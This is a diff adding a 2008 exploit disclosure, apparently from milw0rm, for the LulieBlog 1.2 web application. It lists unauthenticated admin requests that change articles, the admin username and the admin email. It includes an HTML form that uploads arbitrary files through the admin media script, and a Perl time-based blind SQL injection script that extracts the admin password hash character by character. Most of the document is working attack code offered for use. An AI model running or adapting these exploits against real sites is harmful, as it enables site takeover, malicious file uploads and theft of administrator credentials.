@@ -1,0 +1,124 @@
+# LulieBlog 1.2 Multiple Remote Vulnerabilities (Admin Auth Bypass, Upload File, Blind SQL Injection)
+# Author: Cod3rZ
+# Site: http://cod3rz.helloweb.eu
+# Site: http://devilsnight.altervista.org
+# Date: 06/05/2008 [dd/mm/yyyy]
+
+# Admin Auth Bypass:
+
+# Modify Articles: send a request to site/Admin/article_modif2.php with:
+# titre=[titlearticle]&text=[text]&media=[media]&id=[idarticle]
+
+# New Article: send a request to site/Admin/article_suppr.php with:
+# titre=[titlearticle]&text=[text]&media=[media]
+
+# Change Admin Username & Blog Title: send a request to site/Admin/util_modif.php with:
+# pseudo=[newadminnick]&titre=[newblogtitle]
+
+# Change Admin Email: send a request to site/Admin/mails_modif.php with:
+# recevmail=1&emetteur=[email]&desti=[email]
+
+# PS: All administration variables are vulnerables!
+
+# Upload File (Simple Exploit):
+ <html>
+ <head><title>LulieBlog Uploader - http://cod3rz.helloweb.eu</title></head>
+ <body bgcolor='#000000' text='#FFFFFF'>
+ <form name='cod3rz' action='site/Admin/media_insert.php' method='post' enctype='multipart/form-data'>
+ <font size='1' face='Verdana'>
+ <center>
+ Title:<br>
+ <input type='text' name='titre'><br>
+ File:<br>
+ <input type='file' name='fichier'><br>
+ <input type='hidden' name='lieu' value='0'>
+ Type File:<br> <select name='typemedia'>
+		   <option value='1'>Image</option>
+		   <option value='2'>Flash</option>
+		   <option value='3'>Archive</option>
+		   <option value='4'>Vid</option>
+		   <option value='6'>Présentation PowerPoint</option>
+		   <option value='7'>Fichiers PDF</option>
+		   </select><br>
+ <input type='submit' name ='upload' value='Upload'></font></center>
+ </form></body></html>
+
+# End 
+
+
+# Blind SQL Injection Exploit:
+
+#!/usr/bin/perl
+# LulieBlog 1.2 Remote Blind SQL Injection Exploit
+# Author : Cod3rZ
+# Site : http://cod3rz.helloweb.eu
+# Site : http://devilsnight.altervista.org
+# Usage : perl lb.pl site
+
+use LWP::UserAgent;
+use HTTP::Request::Common;
+use Time::HiRes;
+
+$ua = LWP::UserAgent->new;
+
+$site = "http://127.0.0.1/blog";
+if(!$site) { &usage; }
+@array = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
+
+sub usage {
+ print " Usage: perl ig.pl site \n";
+ print " Ex.: perl ig.pl http://127.0.0.1 \n";
+}
+sub request {
+ $var = $_[0];
+ $start = Time::HiRes::time();
+ $response = $ua->request(GET $var,s => $var);
+ $response->is_success() || print("$!\n");
+ $end = Time::HiRes::time();
+ $time = $end - $start;
+ return $time
+}
+sub refresh{
+ system("cls");
+ print " -------------------------------------------------\n";
+ print " LulieBlog 1.2 Remote Blind Sql Injection Exploit \n";
+ print " Powered by Cod3rZ                                \n";
+ print " http://cod3rz.helloweb.eu                        \n";
+ print " -------------------------------------------------\n";
+ print " Please Wait..                                    \n";
+ print " Hash : " . $_[3] . "                             \n";
+ print " -------------------------------------------------\n";
+}
+for ($i = 1; $i < 33; $i++)
+ {
+  for ($j = 0; $j < 16; $j++)
+   {
+ $var = $site."/visumedia.php?id=-1' OR (SELECT IF((ASCII(SUBSTRING(`valeur_parametre`,".$i.",1))=".$array[$j]."),benchmark(200000000,CHAR(0)),0) FROM lulieblog_parametres WHERE nom_parametre='pass')/*";
+
+system('pause');
+ $time = request($var);
+ refresh($host,$timedefault,$j,$hash,$time,$i);
+if($time > 4)
+{
+ $time = request($var);
+ refresh($host,$timedefault,$j,$hash,$time,$i);
+ $hash .= chr($array[$j]);
+ refresh($host,$timedefault,$j,$hash,$time,$i);
+ $j=200;
+}}
+
+if($i == 1 && !$hash)
+{
+ print " Failed                                           \n";
+ print " -------------------------------------------------\n";
+ die();
+}
+if($i == 32) {
+ print " Exploit Terminated                               \n";
+ print " -------------------------------------------------\n ";
+ system('pause');
+}}
+
+# http://cod3rz.helloweb.eu
+
+# milw0rm.com [2008-05-18]
